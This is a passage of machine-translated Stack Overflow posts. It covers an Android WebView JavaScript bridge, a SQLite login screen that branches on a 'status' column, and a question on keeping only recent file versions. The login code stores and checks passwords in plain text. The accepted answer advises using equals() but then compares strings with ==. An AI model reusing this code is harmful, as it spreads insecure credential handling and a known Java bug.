 WebView mWebView = (WebView) findViewById(R.id.webView1);
    mWebView.getSettings().setJavaScriptEnabled(true);
    mWebView.addJavascriptInterface(this, "webConnector");
    mWebView.addJavascriptInterface(this, "toaster");
    mWebView.loadUrl("file:///android_asset/table.html");
    }

    public String load() {
        Log.e("HelloJavascript","HelloJavascript");
        return "{\"key\":\"data\"}";
    }

    public void print(String message){
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show();
    } 
```

和 HTML

```
 <html>
    <head>
    <title>Test</title>
    <script type="text/javascript">

    function loader() {
        var jsonData = window.webConnector.load();
        toaster.print(jsonData);
    }

    </script>
    </head>
    <body onload="loader()">
    Do nothing
    </body>
    </html> 
```

# android - 想要将存储的列值与某个字符串进行比较

> ID：10114996
> 
> 赞同：0
> 
> 时间：2012-04-11T22:41:16.197
> 
> 标签：android, sqlite

> 我只想知道如何获取我的列“STATUS”之一的列值，以便将其与字符串“c”和“s”进行比较，以便可以显示相应的页面....！！！

```
 boolean validLogin = validateLogin(username, password, getApplicationContext());
   if(validLogin)
   {
       if(status=="s")

    Intent in = new Intent(getBaseContext(), JSHomePage.class);
    in.putExtra("UserName", muname.getText().toString());
    startActivity(in);
       }
   else if(status=="c")
       {  Intent in = new Intent(getBaseContext(), CompView.class);
        in.putExtra("UserName", muname.getText().toString());
        startActivity(in);}
   } 
```

> 我有一个表名登录，它有 3 个字段用户名、密码和状态..！！这是编辑的代码

```
 public void onClick(View v) 
 {
 switch(v.getId())
 {

 case R.id.register:
  Intent i = new Intent(getBaseContext(), Registration.class);
  startActivity(i);
  break;

 case R.id.login:

  muname = (EditText)findViewById(R.id.Ledituname);
  mpassword = (EditText)findViewById(R.id.Leditpw);

  String username = muname.getText().toString();
  String password = mpassword.getText().toString();

  if(username.equals("") || username == null)
  {
   Toast.makeText(getApplicationContext(), "Please enter User Name", Toast.LENGTH_SHORT).show();
  }
  else if(password.equals("") || password == null)
  {
   Toast.makeText(getApplicationContext(), "Please enter your Password", Toast.LENGTH_SHORT).show();
  }
  else
  {
   boolean validLogin = validateLogin(username, password, getApplicationContext());

   if(validLogin)
   {        
       if(status.equals("s"))
       {
    Intent in = new Intent(getBaseContext(), JSHomePage.class);
    in.putExtra("UserName", muname.getText().toString());
    startActivity(in);
       }
       else if(status.equals("c"))
       {  Intent in = new Intent(getBaseContext(), CompView.class);
        in.putExtra("UserName", muname.getText().toString());
        startActivity(in);}
   }
  }
  break;

 }

 }

 private boolean validateLogin(String username, String password, Context baseContext) 
 {
  DB = new DBHelper(getBaseContext());
  SQLiteDatabase db = DB.getReadableDatabase();

  String[] columns = {"_id","status"};

  String selection = "username=? AND password=?";
  String[] selectionArgs = {username,password};

  Cursor cursor = null;
  try{

  cursor = db.query(DBHelper.Login_Table, columns, selection, selectionArgs, null, null, null);

  startManagingCursor(cursor);

  }
  catch(Exception e)

  {
   e.printStackTrace();
  }
int numberOfRows = cursor.getCount();

  if(numberOfRows <= 0)
  {

   Toast.makeText(getApplicationContext(), "User Name and Password miss match..\nPlease Try Again", Toast.LENGTH_LONG).show();
   Intent intent = new Intent(getBaseContext(), Login.class);
   startActivity(intent);
   return false;
  }
  status = cursor.getString(cursor.getColumnIndexOrThrow("status"));

  return true;

 }

 } 
```

> 新的日志猫

```
04-12 20:33:54.169: E/AndroidRuntime(723): FATAL EXCEPTION: main
04-12 20:33:54.169: E/AndroidRuntime(723): android.database.CursorIndexOutOfBoundsException: Index -1 requested, with a size of 1
04-12 20:33:54.169: E/AndroidRuntime(723):  at android.database.AbstractCursor.checkPosition(AbstractCursor.java:580)
04-12 20:33:54.169: E/AndroidRuntime(723):  at android.database.AbstractWindowedCursor.checkPosition(AbstractWindowedCursor.java:214)
04-12 20:33:54.169: E/AndroidRuntime(723):  at android.database.AbstractWindowedCursor.getString(AbstractWindowedCursor.java:41)
04-12 20:33:54.169: E/AndroidRuntime(723):  at com.google.data.Login.validateLogin(Login.java:139)
04-12 20:33:54.169: E/AndroidRuntime(723):  at com.google.data.Login.onClick(Login.java:83)
04-12 20:33:54.169: E/AndroidRuntime(723):  at android.view.View.performClick(View.java:2408)
04-12 20:33:54.169: E/AndroidRuntime(723):  at android.view.View$PerformClick.run(View.java:8816)
04-12 20:33:54.169: E/AndroidRuntime(723):  at android.os.Handler.handleCallback(Handler.java:587)
04-12 20:33:54.169: E/AndroidRuntime(723):  at android.os.Handler.dispatchMessage(Handler.java:92)
04-12 20:33:54.169: E/AndroidRuntime(723):  at android.os.Looper.loop(Looper.java:123)
04-12 20:33:54.169: E/AndroidRuntime(723):  at android.app.ActivityThread.main(ActivityThread.java:4627)
04-12 20:33:54.169: E/AndroidRuntime(723):  at java.lang.reflect.Method.invokeNative(Native Method)
04-12 20:33:54.169: E/AndroidRuntime(723):  at java.lang.reflect.Method.invoke(Method.java:521)
04-12 20:33:54.169: E/AndroidRuntime(723):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868)
04-12 20:33:54.169: E/AndroidRuntime(723):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626)
04-12 20:33:54.169: E/AndroidRuntime(723):  at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T23:21:59.450

你可以试试这个：

创建一个类变量 mStatus ：

```
public String mStatus; 
```

将“STATUS”添加到您的列数组中：

```
String[] columns = {"_id", "status"}; 
```

在您的 validateLogin 方法中返回 true 之前，将状态值放入您的 mStatus 类变量中。

```
mStatus = cursor.getString(cursor.getColumnIndexOrThrow("status")); 
```

请注意，您的代码不是我们所说的“干净代码”，所以我给您一个工作解决方案而不是“干净解决方案”，我让您改进和清理您的课程;-)

还有一件事，为了比较字符串值，你必须使用`myString.equals("myvalue")`而不是`myString == "myvalue"`

最后，您将 mStatus 与“s”和“c”进行比较

```
if(validLogin)
   {
       if(mStatus=="s")
       {//System.out.println("In Valid");
.... 
```

# version-control - 哪种版本控制工具最适合仅存储最后“N”次提交？

> ID：10114998
> 
> 赞同：2
> 
> 时间：2012-04-11T22:41:21.490
> 
> 标签：version-control

我想存储一个每天更新的大文件。我有兴趣仅存储此文件的最后“N”个版本。哪种版本控制工具最适合这项任务？

如果不是版本控制工具，是否有任何其他免费/开源工具可用于此任务？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T22:45:07.757

这取决于您是否介意定期重写存储库。如果你不这样做，你可以使用 Mercurial，例如`hg convert`定期重写 repos 以丢弃旧版本。